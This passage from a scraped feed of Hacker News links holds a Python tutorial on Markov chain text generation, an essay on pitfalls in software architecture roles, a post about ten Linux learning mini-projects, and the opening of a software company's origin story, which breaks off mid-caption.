<p>One method of generating fake but familiar looking text is to use a Markov chain generator. There is a fantastic Python library for doing this called <a href="https://github.com/jsvine/markovify">jsvine/markovify</a> but I wanted to learn more about how it works under the hood so I implemented the algorithms from scratch!</p>
<p>Before we get to text generation, let’s start by generating some fake weather. Skip the following section if you’re familiar with Markov chains.</p>
<h2 id="fake-weather-generation"><a href="#fake-weather-generation" aria-label="fake weather generation permalink"></a>Fake Weather Generation</h2>
<p>I have some historical weather data from my town. The weather here is either sunny or rainy. When it’s sunny, there’s a good chance that it remains sunny the next day. It rarely rains but when it does it often rains for a few days.</p>
<p>Rather than using a naive probability (e.g. there’s an ~83% chance it is sunny vs. rainy on any given day) we’ll use a Markov chain to generate more realistic looking data. Our generated data will have streaks of weather which will more closely resemble real life patterns.</p>
<p>To be specific, if it’s sunny there’s a 10% chance it will be rainy the next day and a 90% chance it will stay sunny. If it’s rainy then there’s 50% chance it will be sunny the next day and a 50% chance it will stay rainy.</p>
<p>Here’s a diagram of this two-state Markov process.</p>
<p><span>
      <a href="https://healeycodes.com/static/e4ae284c37dcdeb9323b73b3637b6709/b6699/weather-markov-chain.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="A Markov chain with the sunny/rainy values as described above." title="A Markov chain with the sunny/rainy values as described above." src="https://healeycodes.com/static/e4ae284c37dcdeb9323b73b3637b6709/b6699/weather-markov-chain.png" srcset="https://healeycodes.com/static/e4ae284c37dcdeb9323b73b3637b6709/a8a0d/weather-markov-chain.png 300w,
https://healeycodes.com/static/e4ae284c37dcdeb9323b73b3637b6709/b6699/weather-markov-chain.png 405w" sizes="(max-width: 405px) 100vw, 405px" loading="lazy">
  </a>
    </span></p>
<p>Instead of using weights to describe probability, let’s distribute the states in a list that we randomly pick from. I find that defining Markov chains like this (while far more computationally expensive) is easier to debug.</p>
<div data-language="python"><pre><code>weather_chain <span>=</span> <span>{</span>
    <span>'sun'</span><span>:</span> <span>[</span><span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'rain'</span><span>]</span><span>,</span>
    <span>'rain'</span><span>:</span> <span>[</span><span>'sun'</span><span>,</span> <span>'rain'</span><span>]</span>
<span>}</span></code></pre></div>
<p>We consume this model by picking a random starting state and using the current state to choose randomly from the possible future states. We do this over and over to generate a sequence.</p>
<div data-language="python"><pre><code><span>import</span> random


weather <span>=</span> <span>[</span>random<span>.</span>choice<span>(</span><span>list</span><span>(</span>weather_chain<span>.</span>keys<span>(</span><span>)</span><span>)</span><span>)</span><span>]</span>

<span>for</span> i <span>in</span> <span>range</span><span>(</span><span>10</span><span>)</span><span>:</span>
    weather<span>.</span>append<span>(</span>random<span>.</span>choice<span>(</span>weather_chain<span>[</span>weather<span>[</span>i<span>]</span><span>]</span><span>)</span><span>)</span></code></pre></div>
<p>In this example output, we can see that rainy days are ‘sticky’ as we would expect from the model. </p>
<div data-language="python"><pre><code><span>[</span><span>'rain'</span><span>,</span> <span>'rain'</span><span>,</span> <span>'rain'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'sun'</span><span>,</span> <span>'rain'</span><span>,</span> <span>'rain'</span><span>,</span> <span>'sun'</span><span>]</span></code></pre></div>
<h2 id="fake-text-generation"><a href="#fake-text-generation" aria-label="fake text generation permalink"></a>Fake Text Generation</h2>
<p>Instead of having a predefined Markov chain like we saw in the previous section, let’s build one from real data. The full source code for this article and the text corpuses can be found at <a href="https://github.com/healeycodes/markov-chain-generator">healeycodes/markov-chain-generator</a>.</p>
<p>The code excerpts assume that we’re generating fiction. So the source text must have capital letters at the start of sentences and full stops at the end of sentences. We can use these two markers to generate text chunks that have a beginning and an end.</p>
<p>In our weather example, the state size was one — to decide the next step in the sequence, we only considered one previous day of weather. When it comes to generating language, a state size of one sometimes isn’t big enough and the arrangement of words can be too random to be interesting. A state size of two is a good starting point. Going higher than two can produce text that is too similar to the original text corpus.</p>
<p>The following function builds a Markov chain in the same format as our weather example. It takes a source text and a state size and returns a dictionary where the keys are the current state and their values are a list of possible future states. The lists contain duplicates and this is how we handle the probabilities of future states.</p>
<div data-language="python"><pre><code><span>def</span> <span>build_model</span><span>(</span>source<span>,</span> state_size<span>)</span><span>:</span>
    <span>'''
    Given a corpus and a state size, build a Markov chain.
    '''</span>
    source <span>=</span> source<span>.</span>split<span>(</span><span>)</span>
    model <span>=</span> <span>{</span><span>}</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span>state_size<span>,</span> <span>len</span><span>(</span>source<span>)</span><span>)</span><span>:</span>
        current_word <span>=</span> source<span>[</span>i<span>]</span>
        previous_words <span>=</span> <span>' '</span><span>.</span>join<span>(</span>source<span>[</span>i<span>-</span>state_size<span>:</span>i<span>]</span><span>)</span>
        <span>if</span> previous_words <span>in</span> model<span>:</span>
            model<span>[</span>previous_words<span>]</span><span>.</span>append<span>(</span>current_word<span>)</span>
        <span>else</span><span>:</span>
            model<span>[</span>previous_words<span>]</span> <span>=</span> <span>[</span>current_word<span>]</span>

    <span>return</span> model</code></pre></div>
<p>Given a tiny source of <code>'An apple is very good. An orange is very bad.'</code> and a state size of <code>2</code> it will produce the following Markov chain. Since the source was so small there are only four possible complete sentences.</p>
<div data-language="json"><pre><code><span>{</span>
  <span>"An apple"</span><span>:</span><span>[</span>
    <span>"is"</span>
  <span>]</span><span>,</span>
  <span>"apple is"</span><span>:</span><span>[</span>
    <span>"very"</span>
  <span>]</span><span>,</span>
  <span>"is very"</span><span>:</span><span>[</span>
    <span>"good."</span><span>,</span>
    <span>"bad."</span>
  <span>]</span><span>,</span>
  <span>"very good."</span><span>:</span><span>[</span>
    <span>"An"</span>
  <span>]</span><span>,</span>
  <span>"good. An"</span><span>:</span><span>[</span>
    <span>"orange"</span>
  <span>]</span><span>,</span>
  <span>"An orange"</span><span>:</span><span>[</span>
    <span>"is"</span>
  <span>]</span><span>,</span>
  <span>"orange is"</span><span>:</span><span>[</span>
    <span>"very"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>The following function consumes the Markov chain model and generates some fake text for us. To achieve a minimum length, we keep generating until we hit the minimum length and then keep going until we reach a token that ends with a full stop. To find a correct starting point, we pick a random key (two words) where the first character is a capital letter.</p>
<div data-language="python"><pre><code><span>def</span> <span>generate_text</span><span>(</span>model<span>,</span> state_size<span>,</span> min_length<span>)</span><span>:</span>
    <span>'''
    Consume a Markov chain model (make sure to specify the &lt;state_size&gt; used)
    to generate text that is at least &lt;min_length&gt; size long.
    '''</span>
    <span>def</span> <span>get_new_starter</span><span>(</span><span>)</span><span>:</span>
        <span>return</span> random<span>.</span>choice<span>(</span><span>[</span>s<span>.</span>split<span>(</span><span>' '</span><span>)</span> <span>for</span> s <span>in</span> model<span>.</span>keys<span>(</span><span>)</span> <span>if</span> s<span>[</span><span>0</span><span>]</span><span>.</span>isupper<span>(</span><span>)</span><span>]</span><span>)</span>
    text <span>=</span> get_new_starter<span>(</span><span>)</span>

    i <span>=</span> state_size
    <span>while</span> <span>True</span><span>:</span>
        key <span>=</span> <span>' '</span><span>.</span>join<span>(</span>text<span>[</span>i<span>-</span>state_size<span>:</span>i<span>]</span><span>)</span>
        <span>if</span> key <span>not</span> <span>in</span> model<span>:</span>
            text <span>+=</span> get_new_starter<span>(</span><span>)</span>
            i <span>+=</span> <span>1</span>
            <span>continue</span>

        next_word <span>=</span> random<span>.</span>choice<span>(</span>model<span>[</span>key<span>]</span><span>)</span>
        text<span>.</span>append<span>(</span>next_word<span>)</span>
        i <span>+=</span> <span>1</span>
        <span>if</span> i <span>&gt;</span> min_length <span>and</span> text<span>[</span><span>-</span><span>1</span><span>]</span><span>[</span><span>-</span><span>1</span><span>]</span> <span>==</span> <span>'.'</span><span>:</span>
            <span>break</span>
    <span>return</span> <span>' '</span><span>.</span>join<span>(</span>text<span>)</span></code></pre></div>
<p>Here are those four possible complete sentences from our previous Markov chain. These can be combined infinitely by our function.</p>
<div data-language="text"><pre><code>'An apple is very bad.'
'An orange is very bad.'
'An orange is very good.'
'An apple is very good.'</code></pre></div>
<h2 id="some-examples"><a href="#some-examples" aria-label="some examples permalink"></a>Some Examples</h2>
<p>We can now feed in large amounts of text from an author and generate fake writing! In fact, any corpus that uses sentences will work with our program. For example, here is the result of feeding in a few Wikipedia articles.</p>
<blockquote>
<p>Cricket is more similar to dust devils and landspouts. They form when a homicide rate of 34.2 per 100,000 was reported. This included 15 officer-involved shootings. One shooting led to the latest hour of it; and lately, I know of but love, desperate love, the worst of all the more remote islands. At around the field. One of Wollstonecraft’s most popular metaphors draw on military concepts: Disease is an early type of fiction that were quick to resort to violence. One of Wollstonecraft’s favorite arguments.</p>
</blockquote>
<p>Here’s some Edgar Allen Poe.</p>
<blockquote>
<p>Count could recollect, it was never worth the trouble of the stranger. But, as usual, enveloped in frequent rolls, or bandages, of linen; but, in place of conference with the whole matter as a natural result of the river, and, plunging through a single slender gold chain, and throws a tranquil but magical radiance over all. I cannot enter into details just now: but it was found, on Sunday morning, that he was forced to allow, had ever suspected of existing in the heathen is unwonted; and fickle-mindedness has ever thought of this life and of cutting him off with a layer of plaster, thickly gilt and painted.</p>
</blockquote>
<h2 id="further-resources"><a href="#further-resources" aria-label="further resources permalink"></a>Further Resources</h2>
<p>The sun/rain example was taken from <a href="https://en.wikipedia.org/wiki/Examples_of_Markov_chains#A_simple_weather_model">Wikipedia</a>. Victor Powell’s article, <a href="https://setosa.io/ev/markov-chains/">Markov Chains</a>, was also helpful for my initial understanding and is worth checking out for the interactive graphics alone.</p>
<p>Some of the articles about Markov chains are a little inaccessible to those without a maths background. However, there’s a Simple English version of Wikipedia. Many articles have an alternative page which you can find by replacing the <code>en</code> in the URL bar with <code>simple</code>. For example, the <a href="https://simple.wikipedia.org/wiki/Markov_chain">simple version</a> of the Markov chain page.</p>
<p>Daniel Shiffman also covered Markov chains in a Coding Challenge on <a href="https://www.youtube.com/watch?v=eGFJ8vugIWA">The Coding Train</a>.</p></section></div>]]>
            </description>
            <link>https://healeycodes.com/generating-text-with-markov-chains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26002911</guid>
            <pubDate>Tue, 02 Feb 2021 16:24:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Behaviours to avoid in a software architecture role]]>
            </title>
            <description>
<![CDATA[
Score 204 | Comments 126 (<a href="https://news.ycombinator.com/item?id=26002543">thread link</a>) | @geidies
<br/>
February 2, 2021 | https://www.danielwatts.info/post/7-behaviours-to-avoid-software-architect/ | <a href="https://web.archive.org/web/*/https://www.danielwatts.info/post/7-behaviours-to-avoid-software-architect/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>Over the years, I’ve had the opportunity to work in architecture roles alongside experienced software/technical/solution architects. Through observing others and my own trial and error, I’ve learned a little bit about what <em>not</em> to do in these roles (because it’s often easier to reflect on what didn’t work rather than what did). Even though I lean towards the idea that everyone should be architecting the system rather than having architects solely responsible - I recognise that some organisations are far from that ideal, and it’s those folks I hope find this list helpful. So here it is, 7 behaviours to avoid if you’re in a software architecture role:</p>
<h2 id="1-dont-ignore-the-engineering-team">1. Don’t ignore the engineering team</h2>
<p>If you’re not “hands-on” with the engineering team either through writing or reviewing code or deep in the technical discussions, then the likelihood is you aren’t close enough to the problems and the individuals on the team. If you’re not feeling their pain, then you are probably lacking the empathy and understanding to provide effective guidance. If you find yourself in this position, I would consider beginning with one-on-ones and pairing with engineers as the quickest way to increase empathy and understanding. Then look to participate in feature kick-offs, technical design discussions and code reviews where necessary.</p>
<h2 id="2-dont-ignore-the-domain">2. Don’t ignore the domain</h2>
<p>It’s part of the role to become a domain expert. This knowledge can be used to act as an effective translator between business and engineering. That said, you’ll want to avoid being a communication bottleneck too, so it’s important to teach, translate and document domain context and business value for the engineering team. This is where techniques like <a href="https://www.atlassian.com/continuous-delivery/principles/value-stream-mapping">value-stream mapping</a>, <a href="https://en.wikipedia.org/wiki/Event_storming">event storming</a> and <a href="https://twitter.com/ntcoding/status/1342805885224177666">domain-driven design</a> can really help.</p>
<h2 id="3-dont-prescribe-or-mandate-architectures">3. Don’t prescribe or mandate architectures</h2>
<p>For the most part, our industry has moved past the notion that a system’s architecture is designed in isolation (or in an ivory tower) and handed-off to engineers to deliver. However, it definitely still happens. Software architecture and development should be inter-weaving activities, with feedback from one influencing the other. Keeping that feedback loop as short as possible will likely lead to better outcomes. So if you would like to design and create more resilient systems and your organisation tends to mandate or prescribe architectures; consider how you can best empower engineers to make sound architecture decisions instead. Working with the engineers to agree on a foundation of architectural principles and accepting that architecture is never done, it should evolve and change over time are good places to begin (see the <a href="https://www.thoughtworks.com/books/building-evolutionary-architectures">Building Evolutionary Architectures</a> book for more on this).</p>
<h2 id="4-dont-just-seek-architectural-consistency">4. Don’t just seek architectural consistency</h2>
<p>Consistency certainly has a place in organisations that build and maintain many systems in order to to help prevent complexity. In my opinion, it’s better to see it as a guideline that will likely have exceptions. Simply seeking or worse, enforcing consistency is a sure-fire way to slow the team down, squash innovation and reduce learning opportunities.</p>
<h2 id="5-dont-forget-about-the-current-architectural-state">5. Don’t forget about the current architectural state</h2>
<p>It can be useful to model a target architecture based on agreed principles and in collaboration with engineers (see #1 and #3 above). However, it must be founded in all the nuance and understanding of the current architecture. Anything else could lead towards a doomed rewrite, an unhappy team or a failed pitch to some confused engineers.</p>
<p>On a similar note, I’ve seen many conversations where stakeholders begin to assume the target state is in fact the current state. This can have significant downsides for the engineering team, for example; a sense of moving too slow, missed tasks that were presumed completed or a lack of appreciation upon completing a large chunk of technical work. Stakeholder discussions about target state may need to include regular reminders about the current state.</p>
<h2 id="6-dont-get-too-attached-to-the-desired-architecture">6. Don’t get too attached to the desired architecture</h2>
<p>It can be easy to fall into the trap of attaching an opinion to your identity, particularly if you’ve got the task of providing a technical direction for an engineering team. New information and unforeseen circumstances will emerge, so any target state will 100% change. As these scenarios surface, you will need to keep an open mind to adapt your view and the direction. A fixed view will only hold back progress. As mentioned in #3, the architecture should be going through constant, incremental change.</p>
<h2 id="7-dont-let-review-processes-stagnate">7. Don’t let review processes stagnate</h2>
<p>As an architect in a large organisation you are likely to be responsible for or actively involved in architectural and security review processes, either as a reviewer or seeking a review. These processes are often change approval reviews that give the green-light for a production release. They can be long and drawn out, unclear in their value, involve reviewers who have zero context, and result in unwanted or unnecessary outcomes; making them the perfect candidates for resisting change. As a more senior figure, an architect should be working hard against that intuition. They should seek to understand the purpose and value of the review process and relay it to others. They should be leading or guiding engineering teams through these processes, particularly for the first time. But most importantly, they should be constantly pushing to <a href="https://cloud.google.com/solutions/devops/devops-process-streamlining-change-approval">improve, reduce or potentially remove a review process</a> depending on its purpose and added value.</p>
<p>There you have it! Hopefully I’ll learn even more things to avoid in future but for now, avoid these and you should be good; or at the very least better than a bunch of scenarios I’ve witnessed. For more advice on the topic of software architecture, check out these excellent reads too:</p>
<ul>
<li><a href="https://martinfowler.com/articles/architect-elevator.html">The  Architect Elevator</a> - Visiting the upper floors</li>
<li><a href="https://martinfowler.com/articles/value-architectural-attribute.html">The Elephant in the Architecture</a> - Why business value should be treated as an architectural attribute</li>
<li><a href="https://mailchi.mp/4aeb4085ec6a/17-dear-architects?e=65367d58cd">This book reading list</a> by <a href="https://www.deararchitects.xyz/">Dear Architects,</a> has five books worth reading, including <a href="https://www.thoughtworks.com/de/books/building-evolutionary-architectures">Building Evolutionary Architectures</a>, and sums them up better than I could. It’s also an excellent newsletter.</li>
</ul>
<p><em>Thanks to Vivek Jain, Hugo Nogueira and Robin Weston for reviewing various versions of this post.</em></p>

    </div></div>]]>
            </description>
            <link>https://www.danielwatts.info/post/7-behaviours-to-avoid-software-architect/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26002543</guid>
            <pubDate>Tue, 02 Feb 2021 16:00:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting better at Linux with mini-projects]]>
            </title>
            <description>
<![CDATA[
Score 892 | Comments 111 (<a href="https://news.ycombinator.com/item?id=26002335">thread link</a>) | @carltheperson
<br/>
February 2, 2021 | https://carltheperson.com/posts/10-things-linux | <a href="https://web.archive.org/web/*/https://carltheperson.com/posts/10-things-linux">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><i>2020-11-28<!-- --> Carl Riis</i></p><hr><h3>How do you advance your Linux skills when you are already comfortable with the basics? My solution was to come up with 10 subjects to learn and create an accompanying mini-project.</h3><p>All the source code for the projects can be found in <a href="https://github.com/carltheperson/10-things-linux">this</a> GitHub repository.</p><h2>1. UNIX - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/1_UNIX__Recat">Recat</a></h2><p>The first thing I wanted to learn more about was UNIX since Linux is a UNIX-like operating system. I also never really felt that I fully understood what exactly UNIX was, besides being a family of fairly similar operating systems.</p><p>The first thing I did was to read the entire Wikipedia page on UNIX. I also read <a href="https://people.eecs.berkeley.edu/~brewer/cs262/unix.pdf">this</a> original paper written by Dennis Ritchie and Ken Thompson from 1974, which was really interesting though I can’t say I understood all of it. After some more reading and some Youtube videos, I felt comfortable that I understood what UNIX was, and what makes it interesting.</p><p>For the project, I decided to try and write my first C program. Following the Unix philosophy, I made sure that it did one thing only. That thing ended up being a program that reverses the contents of a text file. Since this is just a reverse version of <em>cat</em>, I called the program <em>recat</em>.</p><p><img src="https://carltheperson.com/media/10-things-linux/1_UNIX__Recat/screenshot.png" alt=""></p><h2>2. What is a shell? - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/2_What_is_a_shell__SeaShell">SeaShell</a></h2><p>For this project, I was curious to find out what exactly a shell was. Even though it is something that I use often, I was still confused about what differentiates it from the terminal. Turns out it’s really not that complicated. I learned this by rereading the <em>shell</em> part of <a href="https://people.eecs.berkeley.edu/~brewer/cs262/unix.pdf">the paper</a> from the previous project, and some explanations online like <a href="https://www.tutorialspoint.com/unix/unix-what-is-shell.htm">this</a> and <a href="https://linuxcommand.org/lc3_lts0010.php">this one</a>. The Unix shell Wikipedia entry was also very informative.</p><p>Since this project is about the shell, I found it appropriate to try and write my own. I settled on the name <em>SeaShell</em>, which I found way too funny. It’s not very advanced, but it does the job.</p><p><img src="https://carltheperson.com/media/10-things-linux/2_What_is_a_shell__SeaShell/screenshot.png" alt=""></p><h2>3. Ownership and permissions - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/3_Ownership_and_permissions__Tellaccess">Tellaccess</a></h2><p>This is one of the things that I know is really important for Linux, but have never really understood. I have tried before but never been able to get the knowledge to stick, maybe because I didn't really care about security until now.</p><p>The ownership and permission system turned out to be really intuitive, and I was able to understand the basics from <a href="https://www.thegeekdiary.com/understanding-basic-file-permissions-and-ownership-in-linux/">this</a> one article. I later discovered <a href="https://linuxhandbook.com/linux-file-permissions/">this one</a> from Linux Handbook which was more comprehensive.</p><p>For the project, I decided to create a program that tells you in human-readable form, the ownership and permissions of a file. I called the project <em>tellaccess</em> because it tells you who can access the file in what ways.</p><p><img src="https://carltheperson.com/media/10-things-linux/3_Ownership_and_permissions__Tellaccess/screenshot.png" alt=""></p><h2>4. Grep - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/4_Grep__Grep_detective">Grep detective</a></h2><p>Grep is the sort of UNIX magic I have always wanted to learn. Since <em>grep</em> is all about regular expressions I would have to learn that first. This was actually quite difficult because grep uses the <em>POSIX Basic Regular Expressions</em>, which is not that common. The <a href="https://en.wikibooks.org/wiki/Regular_Expressions/POSIX_Basic_Regular_Expressions">Wikipedia entry</a> was a lifesaver. Besides that, I also used the man page for <em>grep</em> as a reference.</p><p>For the project, I thought that a fun idea might be to create a detective game. In the game, you get a folder full of files, and it’s your job to extract information. I called the game <em>Grep detective</em>.</p><p><img src="https://carltheperson.com/media/10-things-linux/4_Grep__Grep_detective/screenshot.png" alt=""></p><h2>5. Awk and sed - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/5_Awk_and_sed__Passwdinfo">Passwdinfo</a></h2><p><em>Awk</em> and <em>sed</em> are more of the UNIX magic that I have always thought was really cool, though I never really understood what they were used for. I often saw answers on Stack Overflow with people using them in crazy one-liners, but I always copy-pasted them without much thought. Well, time to unravel the mystery.</p><p>I primarily used <a href="https://www-users.york.ac.uk/~mijp1/teaching/2nd_year_Comp_Lab/guides/grep_awk_sed.pdf">this</a> paper to learn about them. For the project, I wanted to create my own one-liner that shows information about the users on your system in a clear way. I found just reading the <em>/etc/passwd</em> a little too messy, so the project <em>passwdinfo</em>, displays the most important information in a neat table. I found information about the <em>/etc/passwd</em> file <a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">here</a>.</p><p><img src="https://carltheperson.com/media/10-things-linux/5_Awk_and_sed__Passwdinfo/screenshot.png" alt=""></p><h2>6. Find - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/6_Find__Find_treasure_hunt">Find treasure hunt</a></h2><p>Another important tool I never really got around to learning. Learning how to use <em>find</em> was fairly easy, it was mostly about memorizing the different flags, and the format you set the flags in. I used <a href="https://kb.iu.edu/d/admm">this</a> as a reference.</p><p>For the project, I created a treasure hunt where you look for clues in files with different attributes. I first wrote a script that created a bunch of small files and directories as noise. Then a selected few of the files got clues to the whereabouts of the other ones. In the end, you find the treasure, which I won’t tell you what is.</p><p><img src="https://carltheperson.com/media/10-things-linux/6_Find__Find_treasure_hunt/screenshot.png" alt=""></p><h2>7. File system - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/7_File_system__Root_tour">Root tour</a></h2><p>Ever since I executed my first <em>ls /</em> I have wondered what all those directories were for. Time to unveil the mystery. The first thing I did was read <a href="https://www.linux.com/training-tutorials/linux-filesystem-explained/">this</a> article as it explained each directory in root and provided a nice graph. <a href="https://tldp.org/LDP/intro-linux/html/sect_03_01.html">This</a> resource was also nice since it had a table that summed up each directory in one or two sentences.</p><p>The project ended up being a program that gives you descriptions for directories in your own root folder.</p><p><img src="https://carltheperson.com/media/10-things-linux/7_File_system__Root_tour/screenshot.png" alt=""></p><h2>8. Processes - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/8_Processes__Stranger_danger">Stranger danger</a></h2><p>Processes are another important element of Linux that I have never gotten around to learning. Like many other subjects I have covered here, it turned out to be fairly intuitive. <a href="https://www.geeksforgeeks.org/processes-in-linuxunix/">This</a> article was really easy to understand.</p><p>I was contemplating for a while what kind of project I could create but ultimately came up with a command that prints all processes that don’t belong to you or root. That way, you can keep a close eye on who is creating processes. Note, there are many legitimate reasons that other users would run processes on your system, and it rarely means someone has gained access to your computer.</p><p><img src="https://carltheperson.com/media/10-things-linux/8_Processes__Stranger_danger/screenshot.png" alt=""></p><h2>9. Systemd services - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/9_Systemd_services__Createservice">Createservice</a></h2><p>Whenever I try to set up a database on a Linux machine I have been confused about how to configure the <em>systemd</em> service. I have also been in situations where I needed to create a service from a binary but always struggled. The struggle ends now.
As with any new subject, it’s always a good idea to read the Wikipedia page, so that is where I started. Surprisingly, I learned that <em>systemd</em> is a quite controversial piece of software, but I still wanted to learn it and judge it for myself.
For understanding the basics of <em>systemd</em> I read <a href="https://www.digitalocean.com/community/tutorials/how-to-use-systemctl-to-manage-systemd-services-and-units">this</a> and for understanding how to create a new service I read <a href="https://www.tecmint.com/create-new-service-units-in-systemd/">this</a>.</p><p>For the project, I made <em>createservice</em>, which allows you to make a <em>systemd</em> service from any executable that will automatically start up on boot. Here I test it out on Prometheus:</p><p><img src="https://carltheperson.com/media/10-things-linux/9_Systemd_services__Createservice/screenshot.png" alt=""></p><h2>10. Bash scripting - <a href="https://github.com/carltheperson/10-Things-Linux/tree/master/10_Bash_scripting__Penguin_cipher">Penguin cipher</a></h2><p>Bash scripting is something I have been avoiding for a long time. Partly because I believe that my programming language of choice, Go, is almost as handy when it comes to scripting, and partly because I think that Bash syntax looks horrible. Can’t knock it till you try it, so here I am trying to learn Bash scripting.</p><p><a href="https://www.howtogeek.com/67469/the-beginners-guide-to-shell-scripting-the-basics/">This</a> was a nice introduction, and after finding <a href="https://devhints.io/bash">this</a> cool cheatsheet I felt comfortable trying to create a project.</p><p>The project ended up being a cipher program I called <em>Penguin cipher</em> after Linux’s mascot. It allows you to encrypt text into something like this: <em>MTExIDIxMSAzMTMgNDAyIDQ2OCA0NjQgMTU5IDI0MSAyMzAgMzY3IDM3NCA1MjYgMTM3IDIyMiAyOTUgMzYzIDQzNCA0MzUg</em></p><p><img src="https://carltheperson.com/media/10-things-linux/10_Bash_scripting__Penguin_cipher/screenshot.png" alt=""></p><hr><p>Follow me on <a href="https://twitter.com/carltheperson">Twitter</a></p><div><p>Email me at: <!-- -->  </p><div><p>c</p><p>a</p><p>r</p><p>l</p><p>t</p><p>h</p><p>e</p><p>p</p><p>e</p><p>r</p><p>s</p><p>o</p><p>n</p><p>_</p><p>p</p><p>r</p><p>o</p><p>t</p><p>o</p><p>n</p><p>m</p><p>a</p><p>i</p><p>l</p><p>:</p><p>c</p><p>o</p><p>m</p></div></div></div></div></div>]]>
            </description>
            <link>https://carltheperson.com/posts/10-things-linux</link>
            <guid isPermaLink="false">hacker-news-small-sites-26002335</guid>
            <pubDate>Tue, 02 Feb 2021 15:47:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Development Outsourcing: Our Story]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 107 (<a href="https://news.ycombinator.com/item?id=26002217">thread link</a>) | @eagle323
<br/>
February 2, 2021 | https://ascendixtech.com/software-development-outsourcing-our-story/ | <a href="https://web.archive.org/web/*/https://ascendixtech.com/software-development-outsourcing-our-story/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span data-contrast="none">Nowadays, there are thousands of well-known companies with hundreds&nbsp;</span><span data-contrast="none">of corporate</span><span data-contrast="none">&nbsp;offices in multiple&nbsp;</span><span data-contrast="none">countries. It is hard to imagine and believe that many years</span><span data-contrast="none">&nbsp;ago there&nbsp;</span><span data-contrast="none">was</span><span data-contrast="none">&nbsp;only the idea and motivation of founders to create something big. </span></p><p><span data-contrast="none">Ascendix&nbsp;</span><span data-contrast="none">Technologies&nbsp;</span><span data-contrast="none">is no exception</span><span data-contrast="none">&nbsp;and</span><span data-contrast="none">&nbsp;</span><span data-contrast="none">today we want to tell you our story&nbsp;</span><span data-contrast="none">of&nbsp;</span><span data-contrast="none">becom</span><span data-contrast="none">ing&nbsp;</span><span data-contrast="none">a&nbsp;</span><span data-contrast="none">leading&nbsp;</span><span data-contrast="none">software</span><span data-contrast="none">&nbsp;development company</span><span data-contrast="none">&nbsp;with&nbsp;</span><span data-contrast="none">diverse</span><span data-contrast="none">&nbsp;expertise</span><span data-contrast="none">.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p><p><span data-contrast="none">In order to&nbsp;</span><span data-contrast="none">leave no detail to chance, we asked our Chief Technical Officer and Managing Partner&nbsp;</span><span data-contrast="none">Todd Terry to describe the Ascendix journey into software development</span><span data-contrast="none">&nbsp;in first person</span><span data-contrast="none">.</span><span data-contrast="none">&nbsp;So, let’s get down to business.</span></p></div><div data-anchor="Birth of an Idea "><h2><strong>Birth of an Idea</strong></h2><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>It was a Saturday afternoon in October, about 25 years ago, when my longtime friend Wes Snow and I were grabbing a beer during&nbsp;</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>halftime of the</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>&nbsp;Texas/OU game in Dallas. </span></span></p><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>The way I remember the conversation, we were wondering out loud how cool it would be to start our own business of sorts. I’m not sure we knew exactly what we would do – no defining idea, no special market opportunity</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>. </span></span></p><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>We were</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>&nbsp;just two recent university grads, still suffering from a terrible economy and generally dissatisfied with our current career options. </span></span></p><p><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>Wes was working&nbsp;</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>on a helpdesk</span></span><span lang="EN-US" xml:lang="EN-US" data-contrast="none"><span>&nbsp;for a financial services company and I was working on a helpdesk for an oil and gas exploration company.</span></span></p><div id="attachment_2017"><p><img aria-describedby="caption-attachment-2017" title="Todd and Wes on the Texas-OU game | Ascendix" src="https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1.jpg" data-src="https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1.jpg" alt="Todd and Wes on the Texas-OU game" width="799" height="603" data-srcset="https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1.jpg 799w, https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1-300x226.jpg 300w, https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1-768x580.jpg 768w" data-sizes="(max-width: 799px) 100vw, 799px" srcset="https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1.jpg 799w, https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1-300x226.jpg 300w, https://ascendixtech.com/wp-content/uploads/2020/12/Screenshot_1-768x580.jpg 768w"></p><p id="caption-attachment-2017">Todd Terry and Wes 